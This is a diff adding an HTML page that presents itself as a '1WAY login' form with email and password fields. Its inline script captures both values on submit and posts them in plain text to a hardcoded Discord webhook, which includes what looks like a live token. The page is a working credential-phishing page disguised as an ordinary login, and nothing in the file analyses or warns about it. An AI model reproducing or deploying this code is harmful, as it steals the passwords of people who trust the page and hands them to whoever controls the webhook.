@@ -1,0 +1,106 @@
+<html></html>
+  <head>
+    <title>1WAY CE</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,400,500,600,700&display=swap">
+    <style>
+      body {
+        font-family: 'Inter', sans-serif;
+        background-color: #f7f7f7;
+      }
+      .container {
+        max-width: 400px;
+        margin: 40px auto;
+        padding: 20px;
+        background-color: #fff;
+        border: 1px solid #ddd;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      }
+      .form-group {
+        margin-bottom: 20px;
+      }
+      .form-label {
+        display: block;
+        margin-bottom: 10px;
+        font-weight: 500;
+        color: #333;
+      }
+      .form-control {
+        width: 100%;
+        height: 40px;
+        padding: 10px;
+        font-size: 16px;
+        border: 1px solid #ccc;
+      }
+      .btn {
+        width: 100%;
+        height: 40px;
+        padding: 10px;
+        font-size: 16px;
+        font-weight: 500;
+        color: #fff;
+        background-color: #337ab7;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+      .btn:hover {
+        background-color: #23527c;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>1WAY login</h1>
+      <form id="webhook-form">
+        <div class="form-group">
+          <label for="emailInput" class="form-label">Email</label>
+          <input type="text" class="form-control" id="emailInput">
+        </div>
+        <div class="form-group">
+          <label for="passwordInput" class="form-label">Password</label>
+          <input type="text" class="form-control" id="passwordInput">
+        </div>
+        <button type="submit" class="btn">Log in</button>
+        <button onclick="window.location.href='signup.html';">
+            Sign up
+          </button>
+      </form>
+
+      <script>
+        const form = document.getElementById('webhook-form');
+        form.addEventListener('submit', sendToDiscord);
+
+        async function sendToDiscord(ev) {
+          ev.preventDefault();
+          const emailInput = document.getElementById('emailInput');
+          const passwordInput = document.getElementById('passwordInput');
+          const email = emailInput.value;
+          const password = passwordInput.value;
+
+          const webhookUrl = 'https://discord.com/api/webhooks/1285568476626554881/sfbUwrlE7GLkIZnBfLSp7Nsk1ncTgCKkba-OneRUiy4O-Kv1lftEm3plBiEBeuJSzYkc';
+          const webhookBody = {
+            content: `Email: ${email}\nPassword: ${password}`
+          };
+
+          try {
+            const response = await fetch(webhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(webhookBody)
+            });
+
+            if (response.ok) {
+              console.log('Message sent to Discord successfully!');
+            } else {
+              console.error('Error sending message to Discord:', response.status);
+            }
+          } catch (error) {
+            console.error('Error sending message to Discord:', error);
+          }
+        }
+      </script>
+    </div>
+  </body>
+</html>
